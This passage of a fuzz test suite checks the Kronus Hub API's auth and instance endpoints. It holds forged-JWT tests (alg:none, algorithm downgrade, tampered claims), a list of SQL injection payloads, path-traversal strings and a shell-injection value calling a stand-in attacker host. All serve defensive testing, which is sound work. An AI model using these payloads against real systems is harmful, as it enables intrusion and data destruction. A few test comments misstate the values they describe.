// fuzz.test.ts — Adversarial / fuzz test suite for Kronus Hub auth and instance endpoints
//
// Coverage:
//   - POST /auth/register
//   - POST /auth/login
//   - POST /auth/refresh
//   - POST /instances/register
//   - POST /instances/heartbeat
//   - DELETE /instances/:id
//
// Strategies applied:
//   1. Malformed JWTs (truncated, alg:none, alg:HS256, expired, tampered payload, missing claims)
//   2. SQL injection strings in every user-supplied field
//   3. Oversized payloads (10 KB, 100 KB, 1 MB — the /auth/* body limit is 64 KB)
//   4. Invalid JSON (malformed, top-level array, number, null, missing Content-Type)
//   5. Boundary values (empty string, null, whitespace-only, 10 K-char strings, Unicode, control chars)
//   6. Path traversal in DELETE /instances/:id
//   7. Type confusion (number/boolean/array/object where string expected)
//   8. Header manipulation (missing Content-Type, wrong Content-Type, lowercase "bearer",
//      token in query param, oversized Authorization header)
//   9. Auth bypass (token in query param, "bearer" lowercase, empty header value)
//
// Test structure mirrors the existing integration tests:
//   - env vars and mock.module() MUST precede all static imports (Bun module resolution order)
//   - All tests assert on HTTP status codes and structured error shape
//   - No source files are modified

// ---------------------------------------------------------------------------
// 1. Environment — must be first
// ---------------------------------------------------------------------------

process.env["DATABASE_URL"] =
  process.env["DATABASE_URL"] ?? "postgres://user:pass@localhost:5432/kronus_test";
process.env["REDIS_URL"] = process.env["REDIS_URL"] ?? "redis://localhost:6379";
process.env["HUB_URL"] = process.env["HUB_URL"] ?? "http://localhost:3100";

// ---------------------------------------------------------------------------
// 2. DB mock — intercept before static imports
// ---------------------------------------------------------------------------

import { mock } from "bun:test";

type MockRow = Record<string, unknown>;

let _selectReturn: MockRow[] = [];
let _insertReturn: MockRow[] = [];
let _deleteReturn: MockRow[] = [];

const mockSelectBuilder = {
  from: () => mockSelectBuilder,
  where: () => mockSelectBuilder,
  limit: () => Promise.resolve(_selectReturn),
};

const mockInsertBuilder = {
  values: () => mockInsertBuilder,
  returning: () => Promise.resolve(_insertReturn),
};

const mockUpdateBuilder = {
  set: () => mockUpdateBuilder,
  where: () => Promise.resolve([]),
};

const mockDeleteBuilder = {
  where: () => mockDeleteBuilder,
  returning: () => Promise.resolve(_deleteReturn),
};

const mockDb = {
  select: (_fields?: unknown) => mockSelectBuilder,
  insert: (_table?: unknown) => mockInsertBuilder,
  update: (_table?: unknown) => mockUpdateBuilder,
  delete: (_table?: unknown) => mockDeleteBuilder,
};

mock.module("../../src/db/index.js", () => ({ db: mockDb, sql: {} }));

// ---------------------------------------------------------------------------
// 3. Static imports — safe after env + mock
// ---------------------------------------------------------------------------

import { describe, it, expect, beforeAll, beforeEach } from "bun:test";
import { app } from "../../src/index.js";
import { initializeKeys, signAccessToken, signRefreshToken } from "../../src/auth/jwt.js";

// ---------------------------------------------------------------------------
// 4. Fixtures and helpers
// ---------------------------------------------------------------------------

const TEST_USER_ID = "krn_usr_fuzztest0001";
const TEST_INSTANCE_ID = "krn_inst_fuzzinst01";

/** Sign a plain user-scoped access token. */
async function makeUserToken(userId = TEST_USER_ID): Promise<string> {
  return signAccessToken({
    sub: userId,
    plan: "free",
    capabilities: ["apps:install"],
    app_access: [],
    scopes: ["read"],
  });
}

/** Sign an instance-scoped access token (carries instance_id). */
async function makeInstanceToken(
  userId = TEST_USER_ID,
  instanceId = TEST_INSTANCE_ID
): Promise<string> {
  return signAccessToken({
    sub: userId,
    instance_id: instanceId,
    plan: "free",
    capabilities: ["apps:install"],
    app_access: [],
    scopes: ["read"],
  });
}

/**
 * Build a raw Request with an arbitrary body string.
 * Allows testing malformed JSON and wrong Content-Type.
 */
function rawRequest(
  method: string,
  path: string,
  body: string,
  headers: Record<string, string> = {}
): Request {
  return new Request(`http://localhost${path}`, {
    method,
    headers: { "Content-Type": "application/json", ...headers },
    body,
  });
}

/** Standard JSON POST helper (mirrors existing test helpers). */
function jsonPost(path: string, body: unknown, token?: string): Request {
  const headers: Record<string, string> = { "Content-Type": "application/json" };
  if (token) headers["Authorization"] = `Bearer ${token}`;
  return new Request(`http://localhost${path}`, {
    method: "POST",
    headers,
    body: JSON.stringify(body),
  });
}

/** Standard DELETE helper. */
function deleteReq(path: string, token?: string): Request {
  const headers: Record<string, string> = {};
  if (token) headers["Authorization"] = `Bearer ${token}`;
  return new Request(`http://localhost${path}`, { method: "DELETE", headers });
}

/** Assert the response has a structured error envelope. */
async function assertErrorShape(response: Response): Promise<void> {
  const body = (await response.json()) as { error?: Record<string, unknown> };
  expect(body.error).toBeDefined();
  expect(typeof body.error!["code"]).toBe("string");
  expect(typeof body.error!["message"]).toBe("string");
}

// ---------------------------------------------------------------------------
// 5. Mock state helpers
// ---------------------------------------------------------------------------

function mockSelectReturns(rows: MockRow[]): void { _selectReturn = rows; }
function mockInsertReturns(rows: MockRow[]): void { _insertReturn = rows; }
function mockDeleteReturns(rows: MockRow[]): void { _deleteReturn = rows; }

// ---------------------------------------------------------------------------
// 6. Global setup
// ---------------------------------------------------------------------------

beforeAll(async () => {
  delete process.env["JWT_PRIVATE_KEY"];
  delete process.env["JWT_PUBLIC_KEY"];
  await initializeKeys();
});

beforeEach(() => {
  _selectReturn = [];
  _insertReturn = [];
  _deleteReturn = [];
});

// ===========================================================================
// Section A — MALFORMED JWTs
//
// The requireAuth middleware does startsWith("Bearer ") then calls verifyToken.
// verifyToken uses jose.jwtVerify with { issuer, audience } — any structural
// mismatch must produce 401, never 500 or a bypass.
// ===========================================================================

describe("Malformed JWTs — requireAuth must reject with 401", () => {
  // Use /instances/register as a representative protected endpoint for all
  // JWT shape tests; the middleware is shared across all instance routes.

  it("truncated token (header only, no dots)", async () => {
    const response = await app.request(
      jsonPost("/instances/register", { public_key: "pk" }, "eyJhbGciOiJFZERTQSJ9")
    );
    expect(response.status).toBe(401);
    await assertErrorShape(response);
  });

  it("truncated token (header.payload, missing signature segment)", async () => {
    const response = await app.request(
      jsonPost(
        "/instances/register",
        { public_key: "pk" },
        "eyJhbGciOiJFZERTQSJ9.eyJzdWIiOiJ0ZXN0In0"
      )
    );
    expect(response.status).toBe(401);
  });

  it("alg:none — unsigned token must be rejected", async () => {
    // Craft a token whose header claims alg=none. jose rejects this but we
    // verify the server does not accidentally accept it.
    const header = Buffer.from(JSON.stringify({ alg: "none", typ: "JWT" })).toString("base64url");
    const payload = Buffer.from(
      JSON.stringify({ sub: TEST_USER_ID, iss: "http://localhost:3100", aud: "kronus-mesh" })
    ).toString("base64url");
    const unsignedToken = `${header}.${payload}.`;

    const response = await app.request(
      jsonPost("/instances/register", { public_key: "pk" }, unsignedToken)
    );
    expect(response.status).toBe(401);
  });

  it("alg:HS256 — symmetric algorithm token must be rejected (server uses EdDSA)", async () => {
    // Simulate a downgrade attack: header claims HS256 with a forged payload.
    const header = Buffer.from(JSON.stringify({ alg: "HS256", typ: "JWT" })).toString("base64url");
    const payload = Buffer.from(
      JSON.stringify({
        sub: TEST_USER_ID,
        iss: "http://localhost:3100",
        aud: "kronus-mesh",
        exp: Math.floor(Date.now() / 1000) + 3600,
      })
    ).toString("base64url");
    // Signature is arbitrary bytes — the verify key type mismatch should cause rejection
    const fakeSignature = Buffer.from("fakefakefakefakefake").toString("base64url");
    const hs256Token = `${header}.${payload}.${fakeSignature}`;

    const response = await app.request(
      jsonPost("/instances/register", { public_key: "pk" }, hs256Token)
    );
    expect(response.status).toBe(401);
  });

  it("expired token — exp set to past timestamp", async () => {
    // Build a structurally valid-looking token whose exp is in the past.
    // We cannot sign it with the real key (ephemeral), so build a tampered one.
    const header = Buffer.from(JSON.stringify({ alg: "EdDSA", typ: "JWT" })).toString("base64url");
    const expiredPayload = Buffer.from(
      JSON.stringify({
        sub: TEST_USER_ID,
        iss: "http://localhost:3100",
        aud: "kronus-mesh",
        exp: 1000000000, // year 2001 — definitely expired
        iat: 999999999,
      })
    ).toString("base64url");
    const bogusSignature = Buffer.from("invalidsignature").toString("base64url");
    const expiredToken = `${header}.${expiredPayload}.${bogusSignature}`;

    const response = await app.request(
      jsonPost("/instances/register", { public_key: "pk" }, expiredToken)
    );
    expect(response.status).toBe(401);
  });

  it("tampered payload — valid header+signature segments but payload mutated", async () => {
    // Sign a real token, then swap out the payload segment with an elevated one.
    const realToken = await makeUserToken();
    const parts = realToken.split(".");
    const tamperedPayload = Buffer.from(
      JSON.stringify({
        sub: "krn_usr_admin",
        plan: "enterprise",
        iss: "http://localhost:3100",
        aud: "kronus-mesh",
        exp: Math.floor(Date.now() / 1000) + 3600,
      })
    ).toString("base64url");
    const tamperedToken = `${parts[0]}.${tamperedPayload}.${parts[2]}`;

    const response = await app.request(
      jsonPost("/instances/register", { public_key: "pk" }, tamperedToken)
    );
    expect(response.status).toBe(401);
  });

  it("access token used where instance-scoped token is required (heartbeat)", async () => {
    // Access tokens without instance_id must be rejected by the heartbeat route
    // with 400 (not 401) — distinct error, but still not a successful bypass.
    const token = await makeUserToken();
    const response = await app.request(jsonPost("/instances/heartbeat", {}, token));
    expect([400, 401]).toContain(response.status);
  });

  it("refresh token submitted as Bearer for a protected endpoint", async () => {
    const refreshToken = await signRefreshToken(TEST_USER_ID);
    // A refresh token IS a valid JWT — it will pass signature verification but
    // the route should still work (requireAuth only validates the JWT structure,
    // not the type claim). This tests that the server does not crash; 200 or
    // 400 (missing instance_id) are both acceptable, but 500 is not.
    const response = await app.request(
      jsonPost("/instances/heartbeat", {}, refreshToken)
    );
    expect(response.status).not.toBe(500);
    expect([400, 401]).toContain(response.status);
  });

  it("token with missing sub claim", async () => {
    // signAccessToken requires sub; craft a raw token without sub.
    const header = Buffer.from(JSON.stringify({ alg: "EdDSA", typ: "JWT" })).toString("base64url");
    const noSubPayload = Buffer.from(
      JSON.stringify({
        plan: "free",
        iss: "http://localhost:3100",
        aud: "kronus-mesh",
        exp: Math.floor(Date.now() / 1000) + 3600,
      })
    ).toString("base64url");
    const fakeSignature = Buffer.from("invalidsignature").toString("base64url");
    const noSubToken = `${header}.${noSubPayload}.${fakeSignature}`;

    const response = await app.request(
      jsonPost("/instances/register", { public_key: "pk" }, noSubToken)
    );
    expect(response.status).toBe(401);
  });

  it("empty string token value after Bearer prefix", async () => {
    const response = await app.request(
      new Request("http://localhost/instances/register", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Authorization: "Bearer ",
        },
        body: JSON.stringify({ public_key: "pk" }),
      })
    );
    expect(response.status).toBe(401);
  });

  it("token is a plain UUID (not a JWT at all)", async () => {
    const response = await app.request(
      jsonPost(
        "/instances/register",
        { public_key: "pk" },
        "550e8400-e29b-41d4-a716-446655440000"
      )
    );
    expect(response.status).toBe(401);
  });

  it("token is a valid JWT but signed by a different EdDSA key", async () => {
    // Generate a second independent key pair, sign with it — server must reject
    // because the signature does not match the hub's verify key.
    const { privateKey } = await (await import("jose")).generateKeyPair("EdDSA");
    const foreignToken = await new (await import("jose")).SignJWT({
      sub: TEST_USER_ID,
      plan: "free",
    })
      .setProtectedHeader({ alg: "EdDSA" })
      .setIssuer("http://localhost:3100")
      .setAudience("kronus-mesh")
      .setExpirationTime("1h")
      .sign(privateKey);

    const response = await app.request(
      jsonPost("/instances/register", { public_key: "pk" }, foreignToken)
    );
    expect(response.status).toBe(401);
  });
});

// ===========================================================================
// Section B — SQL INJECTION
//
// Drizzle ORM uses parameterized queries, so direct SQL injection through the
// ORM is mitigated at the driver layer. These tests verify:
//   (a) The app does not crash (no 500) when injection strings reach the ORM.
//   (b) Validation layers either reject the input (400) or pass it safely to
//       the mocked ORM (where the mock returns the pre-configured result).
//   (c) Error responses are well-formed JSON, not stack traces.
// ===========================================================================

describe("SQL injection — inputs must not cause 500 errors", () => {
  const SQL_PAYLOADS = [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "admin'--",
    "1; SELECT * FROM users",
    "' UNION SELECT NULL, NULL, NULL--",
    "\\'; exec xp_cmdshell('dir'); --",
    "' OR 1=1--",
    "\" OR \"\"=\"",
    "') OR ('1'='1",
    "%27%20OR%20%271%27%3D%271",    // URL-encoded: ' OR '1'='1
    "\"; WAITFOR DELAY '0:0:5'--",  // MSSQL time-based blind
    "1' AND SLEEP(5)--",            // MySQL time-based blind
    "' AND 1=(SELECT COUNT(*) FROM tabname); --",
  ];

  for (const payload of SQL_PAYLOADS) {
    it(`register: email field injection — ${payload.slice(0, 40)}`, async () => {
      const response = await app.request(
        jsonPost("/auth/register", {
          email: payload,
          name: "Test User",
          password: "password123",
        })
      );
      // Email regex will reject most of these as invalid format (400).
      // None should produce 500.
      expect(response.status).not.toBe(500);
      if (response.status !== 200 && response.status !== 201) {
        await assertErrorShape(response);
      }
    });
  }

  for (const payload of SQL_PAYLOADS) {
    it(`register: name field injection — ${payload.slice(0, 40)}`, async () => {
      mockSelectReturns([]);
      mockInsertReturns([
        { id: TEST_USER_ID, email: "sql@test.com", name: payload, plan: "free" },
      ]);
      const response = await app.request(
        jsonPost("/auth/register", {
          email: "sql@test.com",
          name: payload,
          password: "password123",
        })
      );
      // Name has a 100-char limit but no format restriction — short payloads may
      // pass validation. In all cases no 500.
      expect(response.status).not.toBe(500);
    });
  }

  for (const payload of SQL_PAYLOADS) {
    it(`login: email field injection — ${payload.slice(0, 40)}`, async () => {
      mockSelectReturns([]);
      const response = await app.request(
        jsonPost("/auth/login", { email: payload, password: "password123" })
      );
      expect(response.status).not.toBe(500);
    });
  }

  it("instances/register: SQL injection in public_key field", async () => {
    const token = await makeUserToken();
    mockInsertReturns([{ id: TEST_INSTANCE_ID, user_id: TEST_USER_ID, status: "active", created_at: new Date().toISOString() }]);
    const response = await app.request(
      jsonPost(
        "/instances/register",
        { public_key: "'; DROP TABLE instances; --" },
        token
      )
    );
    expect(response.status).not.toBe(500);
  });

  it("instances/register: SQL injection in machine_fingerprint field", async () => {
    const token = await makeUserToken();
    mockInsertReturns([{ id: TEST_INSTANCE_ID, user_id: TEST_USER_ID, status: "active", created_at: new Date().toISOString() }]);
    const response = await app.request(
      jsonPost(
        "/instances/register",
        {
          public_key: "validpk",
          machine_fingerprint: "'; DROP TABLE instances; --",
        },
        token
      )
    );
    expect(response.status).not.toBe(500);
  });

  it("DELETE /instances/:id — SQL injection in path parameter", async () => {
    const token = await makeUserToken();
    mockDeleteReturns([]);
    // Path params reach the WHERE clause via Drizzle eq() — should be parameterized.
    const response = await app.request(
      deleteReq("/instances/' OR '1'='1", token)
    );
    expect(response.status).not.toBe(500);
    // Drizzle with the injection string as an ID will simply find no rows.
    expect([404, 400]).toContain(response.status);
  });
});

// ===========================================================================
// Section C — OVERSIZED PAYLOADS
//
// /auth/* routes have a 64 KB body limit (bodyLimit middleware in index.ts).
// /instances/* has no explicit limit in the current code — those tests verify
// the app handles large bodies gracefully (no crash).
// ===========================================================================

describe("Oversized payloads", () => {
  it("/auth/register — 10 KB payload (below 64 KB limit)", async () => {
    const response = await app.request(
      jsonPost("/auth/register", {
        email: "overflow@test.com",
        name: "A".repeat(100),
        password: "password123",
        // Extra garbage field to inflate payload size
        garbage: "X".repeat(10 * 1024),
      })
    );
    // Validation will reject the 10 KB name/garbage, but no 500.
    expect(response.status).not.toBe(500);
  });

  it("/auth/register — 100 KB payload (exceeds 64 KB body limit)", async () => {
    const bigBody = JSON.stringify({
      email: "overflow@test.com",
      name: "Test",
      password: "password123",
      garbage: "X".repeat(100 * 1024),
    });
    const response = await app.request(
      rawRequest("POST", "/auth/register", bigBody)
    );
    // bodyLimit middleware should reject this with 413.
    // Accept 413 or 400; never 500.
    expect(response.status).not.toBe(500);
    expect([400, 413]).toContain(response.status);
  });

  it("/auth/login — 100 KB payload (exceeds 64 KB body limit)", async () => {
    const bigBody = JSON.stringify({
      email: "overflow@test.com",
      password: "P".repeat(100 * 1024),
    });
    const response = await app.request(
      rawRequest("POST", "/auth/login", bigBody)
    );
    expect(response.status).not.toBe(500);
    expect([400, 413]).toContain(response.status);
  });

  it("/auth/refresh — 100 KB refresh_token (exceeds body limit)", async () => {
    const bigBody = JSON.stringify({
      refresh_token: "T".repeat(100 * 1024),
    });
    const response = await app.request(
      rawRequest("POST", "/auth/refresh", bigBody)
    );
    expect(response.status).not.toBe(500);
    expect([400, 413]).toContain(response.status);
  });

  it("/auth/register — 1 MB payload", async () => {
    const bigBody = JSON.stringify({
      email: "overflow@test.com",
      name: "Test",
      password: "password123",
      garbage: "X".repeat(1024 * 1024),
    });
    const response = await app.request(
      rawRequest("POST", "/auth/register", bigBody)
    );
    expect(response.status).not.toBe(500);
    expect([400, 413]).toContain(response.status);
  });

  it("/instances/register — 100 KB public_key string (no body limit on this route)", async () => {
    const token = await makeUserToken();
    mockInsertReturns([{ id: TEST_INSTANCE_ID, user_id: TEST_USER_ID, status: "active", created_at: new Date().toISOString() }]);
    const response = await app.request(
      jsonPost("/instances/register", { public_key: "K".repeat(100 * 1024) }, token)
    );
    // No body limit on /instances — should reach validation and either succeed or
    // produce a 400 if a length check is added in future. Must not be 500.
    expect(response.status).not.toBe(500);
  });

  it("/instances/heartbeat — 1 MB installed_apps array", async () => {
    const token = await makeInstanceToken();
    const bigApps = Array.from({ length: 50000 }, (_, i) => `krn_app_fuzz${i}`);
    const response = await app.request(
      jsonPost("/instances/heartbeat", { installed_apps: bigApps }, token)
    );
    expect(response.status).not.toBe(500);
  });
});

// ===========================================================================
// Section D — INVALID JSON
//
// Hono's c.req.json() will throw on parse failure. The global error handler
// should catch it and return 400 (or potentially 500 if unhandled).
// All cases must produce a non-500 response.
// ===========================================================================

describe("Invalid JSON bodies", () => {
  it("/auth/register — completely malformed JSON", async () => {
    const response = await app.request(
      rawRequest("POST", "/auth/register", "{this is not json}")
    );
    expect(response.status).not.toBe(500);
    expect([400, 422]).toContain(response.status);
  });

  it("/auth/register — JSON truncated mid-string", async () => {
    const response = await app.request(
      rawRequest("POST", "/auth/register", '{"email":"test@test.com","password":"pass')
    );
    expect(response.status).not.toBe(500);
    expect([400, 422]).toContain(response.status);
  });

  it("/auth/register — top-level JSON array instead of object", async () => {
    const response = await app.request(
      rawRequest(
        "POST",
        "/auth/register",
        JSON.stringify(["email@test.com", "Test", "password123"])
      )
    );
    expect(response.status).toBe(400);
    await assertErrorShape(response);
  });

  it("/auth/register — top-level JSON number", async () => {
    const response = await app.request(rawRequest("POST", "/auth/register", "42"));
    expect(response.status).toBe(400);
  });

  it("/auth/register — top-level JSON null", async () => {
    const response = await app.request(rawRequest("POST", "/auth/register", "null"));
    expect(response.status).toBe(400);
    await assertErrorShape(response);
  });

  it("/auth/register — top-level JSON boolean true", async () => {
    const response = await app.request(rawRequest("POST", "/auth/register", "true"));
    expect(response.status).toBe(400);
  });

  it("/auth/register — empty body with Content-Type: application/json", async () => {
    const response = await app.request(rawRequest("POST", "/auth/register", ""));
    expect(response.status).not.toBe(500);
    expect([400, 422]).toContain(response.status);
  });

  it("/auth/login — malformed JSON with NUL byte", async () => {
    const response = await app.request(
      rawRequest("POST", "/auth/login", '{"email":"test\u0000@test.com","password":"pw"}')
    );
    expect(response.status).not.toBe(500);
  });

  it("/auth/refresh — deeply nested JSON object (stack depth attack)", async () => {
    // Build a 500-level deep nesting — tests JSON parser depth limits.
    let deep = '"sentinel"';
    for (let i = 0; i < 500; i++) {
      deep = `{"a":${deep}}`;
    }
    const response = await app.request(rawRequest("POST", "/auth/refresh", deep));
    expect(response.status).not.toBe(500);
  });

  it("/instances/register — JSON array at top level", async () => {
    const token = await makeUserToken();
    const response = await app.request(
      new Request("http://localhost/instances/register", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Authorization: `Bearer ${token}`,
        },
        body: JSON.stringify([{ public_key: "pk" }]),
      })
    );
    expect(response.status).toBe(400);
  });

  it("/instances/heartbeat — malformed JSON body", async () => {
    const token = await makeInstanceToken();
    const response = await app.request(
      new Request("http://localhost/instances/heartbeat", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Authorization: `Bearer ${token}`,
        },
        body: "{broken",
      })
    );
    expect(response.status).not.toBe(500);
  });
});

// ===========================================================================
// Section E — BOUNDARY VALUES
//
// Tests empty strings, null, whitespace-only, 10 K-char strings, Unicode
// edge cases, and ASCII control characters in all user-supplied fields.
// ===========================================================================

describe("Boundary values — /auth/register", () => {
  it("email is empty string", async () => {
    const response = await app.request(
      jsonPost("/auth/register", { email: "", name: "Test", password: "password123" })
    );
    expect(response.status).toBe(400);
    await assertErrorShape(response);
  });

  it("email is whitespace-only string", async () => {
    const response = await app.request(
      jsonPost("/auth/register", { email: "   ", name: "Test", password: "password123" })
    );
    expect(response.status).toBe(400);
  });

  it("email is null (type confusion)", async () => {
    const response = await app.request(
      jsonPost("/auth/register", { email: null, name: "Test", password: "password123" })
    );
    expect(response.status).toBe(400);
  });

  it("email is exactly 255 characters (one over the 254-char limit)", async () => {
    // 243 chars local part + @ + 10-char domain + .com = 255 total
    const longEmail = "a".repeat(243) + "@example.com"; // 257 chars
    const response = await app.request(
      jsonPost("/auth/register", {
        email: longEmail,
        name: "Test",
        password: "password123",
      })
    );
    expect(response.status).toBe(400);
  });

  it("email is 10,000 characters", async () => {
    const response = await app.request(
      jsonPost("/auth/register", {
        email: "a".repeat(9990) + "@test.com",
        name: "Test",
        password: "password123",
      })
    );
    expect(response.status).toBe(400);
    expect(response.status).not.toBe(500);
  });

  it("email contains null byte (\\u0000)", async () => {
    const response = await app.request(
      jsonPost("/auth/register", {
        email: "test\u0000@test.com",
        name: "Test",
        password: "password123",
      })
    );
    // Null byte in the local part will fail the email regex
    expect(response.status).toBe(400);
    expect(response.status).not.toBe(500);
  });

  it("email contains CRLF injection (\\r\\n)", async () => {
    const response = await app.request(
      jsonPost("/auth/register", {
        email: "test@test.com\r\nX-Injected: header",
        name: "Test",
        password: "password123",
      })
    );
    expect(response.status).toBe(400);
  });

  it("email contains Unicode right-to-left override character", async () => {
    const response = await app.request(
      jsonPost("/auth/register", {
        email: "test\u202e@test.com",
        name: "Test",
        password: "password123",
      })
    );
    expect(response.status).not.toBe(500);
  });

  it("name is empty string", async () => {
    const response = await app.request(
      jsonPost("/auth/register", {
        email: "test@test.com",
        name: "",
        password: "password123",
      })
    );
    expect(response.status).toBe(400);
  });

  it("name is exactly 101 characters (one over the 100-char limit)", async () => {
    const response = await app.request(
      jsonPost("/auth/register", {
        email: "test@test.com",
        name: "A".repeat(101),
        password: "password123",
      })
    );
    expect(response.status).toBe(400);
  });

  it("name is 10,000 characters", async () => {
    const response = await app.request(
      jsonPost("/auth/register", {
        email: "test@test.com",
        name: "A".repeat(10000),
        password: "password123",
      })
    );
    expect(response.status).toBe(400);
    expect(response.status).not.toBe(500);
  });

  it("name contains Unicode emoji (4-byte codepoints)", async () => {
    mockSelectReturns([]);
    mockInsertReturns([
      { id: TEST_USER_ID, email: "emoji@test.com", name: "Test \uD83D\uDE80 User", plan: "free" },
    ]);
    const response = await app.request(
      jsonPost("/auth/register", {
        email: "emoji@test.com",
        name: "Test \uD83D\uDE80 User",
        password: "password123",
      })
    );
    // Emoji in name is a valid string under 100 chars — should succeed or fail clearly
    expect(response.status).not.toBe(500);
  });

  it("name contains ASCII control characters (\\x01 through \\x1F)", async () => {
    const controlChars = Array.from({ length: 10 }, (_, i) =>
      String.fromCharCode(i + 1)
    ).join("");
    const response = await app.request(
      jsonPost("/auth/register", {
        email: "ctrl@test.com",
        name: `User${controlChars}Name`,
        password: "password123",
      })
    );
    expect(response.status).not.toBe(500);
  });

  it("password is exactly 7 characters (one below minimum)", async () => {
    const response = await app.request(
      jsonPost("/auth/register", {
        email: "test@test.com",
        name: "Test",
        password: "1234567",
      })
    );
    expect(response.status).toBe(400);
  });

  it("password is exactly 129 characters (one over the 128-char maximum)", async () => {
    const response = await app.request(
      jsonPost("/auth/register", {
        email: "test@test.com",
        name: "Test",
        password: "A".repeat(129),
      })
    );
    expect(response.status).toBe(400);
  });

  it("password is exactly 128 characters (at the maximum boundary — should succeed)", async () => {
    mockSelectReturns([]);
    mockInsertReturns([
      { id: TEST_USER_ID, email: "boundary@test.com", name: "Boundary", plan: "free" },
    ]);
    const response = await app.request(
      jsonPost("/auth/register", {
        email: "boundary@test.com",
        name: "Boundary",
        password: "A".repeat(128),
      })
    );
    // 128-char password is at the exact max — must be accepted (201)
    expect(response.status).toBe(201);
  });

  it("password is exactly 8 characters (at the minimum boundary — should succeed)", async () => {
    mockSelectReturns([]);
    mockInsertReturns([
      { id: TEST_USER_ID, email: "boundary2@test.com", name: "Boundary2", plan: "free" },
    ]);
    const response = await app.request(
      jsonPost("/auth/register", {
        email: "boundary2@test.com",
        name: "Boundary2",
        password: "12345678",
      })
    );
    expect(response.status).toBe(201);
  });

  it("password contains null bytes", async () => {
    const response = await app.request(
      jsonPost("/auth/register", {
        email: "test@test.com",
        name: "Test",
        password: "pass\u0000word",
      })
    );
    // JSON null byte in a string is valid JSON; route should not crash
    expect(response.status).not.toBe(500);
  });

  it("all required fields present but with Unicode homograph email", async () => {
    // Cyrillic 'а' (U+0430) looks like ASCII 'a' — homograph attack
    const response = await app.request(
      jsonPost("/auth/register", {
        email: "test@\u0430dmin.com",
        name: "Test",
        password: "password123",
      })
    );
    // The regex ^[^\s@]+@[^\s@]+\.[^\s@]+$ accepts unicode letters — this may
    // pass validation. The important thing is no 500.
    expect(response.status).not.toBe(500);
  });
});

describe("Boundary values — /auth/login", () => {
  it("email is empty string", async () => {
    const response = await app.request(
      jsonPost("/auth/login", { email: "", password: "password123" })
    );
    expect(response.status).toBe(400);
  });

  it("password is empty string", async () => {
    const response = await app.request(
      jsonPost("/auth/login", { email: "test@test.com", password: "" })
    );
    expect(response.status).toBe(400);
  });

  it("both fields are null", async () => {
    const response = await app.request(
      jsonPost("/auth/login", { email: null, password: null })
    );
    expect(response.status).toBe(400);
    await assertErrorShape(response);
  });

  it("password is 10,000 characters (DoS via bcrypt/argon2 cost)", async () => {
    // argon2id is cost-bounded so this should be handled but we verify no 500/crash.
    // Note: validation rejects passwords > 128 chars, so this should return 400 fast.
    mockSelectReturns([]);
    const response = await app.request(
      jsonPost("/auth/login", {
        email: "test@test.com",
        password: "P".repeat(10000),
      })
    );
    // validateLoginBody only checks for non-empty — it does NOT enforce a length max.
    // If the password reaches verifyPassword with 10K chars, argon2 will still run.
    // This verifies no crash. The test may be slow (argon2 cost) — acceptable for
    // a security gate test.
    expect(response.status).not.toBe(500);
  });
});

describe("Boundary values — /auth/refresh", () => {
  it("refresh_token is an empty string", async () => {
    const response = await app.request(
      jsonPost("/auth/refresh", { refresh_token: "" })
    );
    expect(response.status).toBe(400);
  });

  it("refresh_token is whitespace only", async () => {
    const response = await app.request(
      jsonPost("/auth/refresh", { refresh_token: "   " })
    );
    expect(response.status).toBe(400);
  });

  it("refresh_token is null", async () => {
    const response = await app.request(
      jsonPost("/auth/refresh", { refresh_token: null })
    );
    expect(response.status).toBe(400);
  });

  it("refresh_token is a 10,000-character garbage string", async () => {
    const response = await app.request(
      jsonPost("/auth/refresh", { refresh_token: "X".repeat(10000) })
    );
    // jose will fail to parse/verify it — should be 401, not 500
    expect(response.status).not.toBe(500);
    expect([400, 401]).toContain(response.status);
  });
});

describe("Boundary values — /instances/register", () => {
  it("public_key is empty string", async () => {
    const token = await makeUserToken();
    const response = await app.request(
      jsonPost("/instances/register", { public_key: "" }, token)
    );
    expect(response.status).toBe(400);
  });

  it("public_key is whitespace only", async () => {
    const token = await makeUserToken();
    const response = await app.request(
      jsonPost("/instances/register", { public_key: "   " }, token)
    );
    expect(response.status).toBe(400);
  });

  it("public_key is null", async () => {
    const token = await makeUserToken();
    const response = await app.request(
      jsonPost("/instances/register", { public_key: null }, token)
    );
    expect(response.status).toBe(400);
  });

  it("machine_fingerprint contains path traversal characters (../../etc/passwd)", async () => {
    const token = await makeUserToken();
    mockInsertReturns([{ id: TEST_INSTANCE_ID, user_id: TEST_USER_ID, status: "active", created_at: new Date().toISOString() }]);
    const response = await app.request(
      jsonPost(
        "/instances/register",
        { public_key: "validpk", machine_fingerprint: "../../etc/passwd" },
        token
      )
    );
    // No filesystem operations here — path traversal in a string field stored
    // in the DB is harmless at this layer. Must not be 500.
    expect(response.status).not.toBe(500);
  });

  it("kronus_version contains shell metacharacters", async () => {
    const token = await makeUserToken();
    mockInsertReturns([{ id: TEST_INSTANCE_ID, user_id: TEST_USER_ID, status: "active", created_at: new Date().toISOString() }]);
    const response = await app.request(
      jsonPost(
        "/instances/register",
        {
          public_key: "validpk",
          kronus_version: "$(curl attacker.com)",
        },
        token
      )
    );
    expect(response.status).not.toBe(500);
  });

  it("os field contains Unicode null (U+0000)", async () => {
    const token = await makeUserToken();
    mockInsertReturns([{ id: TEST_INSTANCE_ID, user_id: TEST_USER_ID, status: "active", created_at: new Date().toISOString() }]);
    const response = await app.request(
      jsonPost(
        "/instances/register",
        { public_key: "validpk", os: "darwin\u0000linux" },
        token
      )
    );
    expect(response.status).not.toBe(500);
  });
});

describe("Boundary values — /instances/heartbeat", () => {
  it("kronus_version is empty string (valid string, passes type check)", async () => {
    const token = await makeInstanceToken();
    const response = await app.request(
      jsonPost("/instances/heartbeat", { kronus_version: "" }, token)
    );
    // Empty string passes typeof check — route should accept it or store ""
    expect(response.status).not.toBe(500);
    expect([200, 400]).toContain(response.status);
  });

  it("installed_apps is an empty array", async () => {
    const token = await makeInstanceToken();
    const response = await app.request(
      jsonPost("/instances/heartbeat", { installed_apps: [] }, token)
    );
    expect(response.status).toBe(200);
  });

  it("installed_apps contains a non-string element (number)", async () => {
    const token = await makeInstanceToken();
    const response = await app.request(
      jsonPost("/instances/heartbeat", { installed_apps: ["krn_app_valid", 12345] }, token)
    );
    expect(response.status).toBe(400);
  });

  it("installed_apps contains null element", async () => {
    const token = await makeInstanceToken();
    const response = await app.request(
      jsonPost("/instances/heartbeat", { installed_apps: [null] }, token)
    );
    expect(response.status).toBe(400);
